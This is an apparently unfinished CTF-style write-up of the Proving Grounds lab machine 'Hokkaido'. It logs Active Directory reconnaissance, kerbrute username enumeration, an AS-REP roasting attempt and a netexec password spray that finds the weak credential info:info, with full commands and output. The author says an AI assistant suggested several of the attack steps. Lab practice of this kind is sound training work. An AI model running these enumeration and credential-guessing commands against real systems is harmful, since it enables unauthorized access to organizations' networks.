# Report - Hokkaido

- Author: Henry Post
- Target: Hokkaido
- Target IP: 192.168.53.40
- Attacker IP: 192.168.49.53
- Date: 05/13 /2026

## Executive Summary



### Recommendations


## Resources

- https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491


## Recon

I ran an nmap scan that enumerated their ports:

     nmap -sS -sV -p- hokkaido

```txt

???(kali?kali)-[~]
??$ nmap -sS -sV -p- hokkaido
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 23:58 +0000
Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.07% done; ETC: 00:03 (0:03:24 remaining)
Nmap scan report for hokkaido (192.168.53.40)
Host is up (0.00035s latency).
Not shown: 65502 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 00:03:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)

```

Pretty chonky scan. Not sure where to start. Let's try IIS...
Nope. Default page. Let's try gobuster.

```
gobuster dir -u http://hokkaido:80/ -w /usr/share/wordlists/dirb/common.txt
```

Womp womp. `http://hokkaido/aspnet_client/` is the only find.
Let's try `dirb`.

```sh
dirb http://hokkaido/
```

Nothing.

We must need to attack SMB in some way. Let's try to list shares...

```sh
smbclient -L //hokkaido -N
# nope

smbclient -L //192.168.53.40 -N
```

Let's try `nbtscan`.

```sh
nbtscan 192.168.53.40
# nothing
```

Let's try `netexec`...

```sh
netexec smb hokkaido

<<EOF
???(kali?kali)-[~]
??$ netexec smb hokkaido
SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
EOF
```

We might be able to connect further with `netexec`...

Let's ask `z.ai`.

```sh
netexec smb 192.168.53.40 --users
# no users

rpcclient -U "" -N 192.168.53.40
enumdomains # NT_STATUS_ACCESS_DENIED
enumdomusers # NT_STATUS_ACCESS_DENIED
querydominfo # NT_STATUS_ACCESS_DENIED

ldapsearch -x -H ldap://192.168.53.40 -s base namingcontexts

<<EOF
???(kali?kali)-[~]
??$ ldapsearch -x -H ldap://192.168.53.40 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=DomainDnsZones,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=ForestDnsZones,DC=hokkaido-aerospace,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

EOF

ldapsearch -x -H ldap://192.168.53.40 -b "DC=hokkaido-aerospace,DC=com" "(objectClass=user)" sAMAccountName
# fails, 000004DC: LdapErr: DSID-0C090CF8


```

We can check for a DNS Zone Transfer.

```sh
dig axfr @192.168.53.40 hokkaido-aerospace.com
# fails
```

We can test to see if we can access MSSQL.

```sh
impacket-mssqlclient -windows-auth hokkaido-aerospace.com/guest:guest@192.168.53.40
# fails: [-] ERROR(DC\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.

```

No usernames yet.

We decide to run a script scan with `nmap`...

```txt
???(kali?kali)-[~]
??$ nmap -sC hokkaido
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 00:20 +0000
Nmap scan report for hokkaido (192.168.53.40)
Host is up (0.00036s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-05-13T23:56:37
|_Not valid after:  2027-05-13T23:56:37
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-05-13T23:56:37

```

It doesn't really tell us anything we don't already know...

Sent the above to `z.ai`, it suggested I use a Kerberos brute-force tool.

```sh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 ./kerbrute
chmod +x ./kerbrute

./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.53.40 /usr/share/seclists/Usernames/cirt-default-usernames.txt

<<EOF
2026/05/14 00:24:50 >  [+] VALID USERNAME:       ADMINISTRATOR@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
EOF
```

Cool beans. We found two real users.

```txt
Administrator
INFO
```

Asking our shiny chrome overlord `z.ai` for more advice, it suggests AS-REP Roasting.

```sh
echo "administrator" > users.txt
echo "info" >> users.txt

impacket-GetNPUsers hokkaido-aerospace.com/ -dc-ip 192.168.53.40 -usersfile users.txt
# rip
<<EOF
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User info doesn't have UF_DONT_REQUIRE_PREAUTH set
EOF
```

Okay. So.

```sh
netexec smb 192.168.53.40 -u users.txt -p 'info'

<<EOF
???(kali?kali)-[~]
??$ netexec smb 192.168.53.40 -u users.txt -p 'info'

SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.53.40   445    DC               [-] hokkaido-aerospace.com\administrator:info STATUS_LOGON_FAILURE
SMB         192.168.53.40   445    DC               [+] hokkaido-aerospace.com\info:info 

EOF
```

It's just `info:info`. Sweet!


## Root access


